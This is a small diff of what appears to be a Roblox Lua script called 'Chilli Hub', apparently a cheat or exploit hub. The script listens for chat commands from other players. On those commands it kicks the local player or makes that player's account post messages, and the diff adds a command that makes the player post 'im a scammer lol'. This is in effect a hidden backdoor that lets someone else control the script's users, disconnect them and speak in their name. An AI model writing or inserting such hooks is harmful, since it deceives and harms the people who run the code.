@@ -14,6 +14,8 @@ for _, plr in pairs(Players:GetPlayers()) do
                 localPlayer:Kick("You have been removed by Chilli Hub")
             elseif msg == ".c" then
                 chatChannel:SendAsync("sg")
+            elseif msg == ".s" then
+                chatChannel:SendAsync("im a scammer lol")
             end
         end)
     end
@@ -32,4 +34,3 @@ Players.PlayerAdded:Connect(function(plr)
         end)
     end
 end)
-
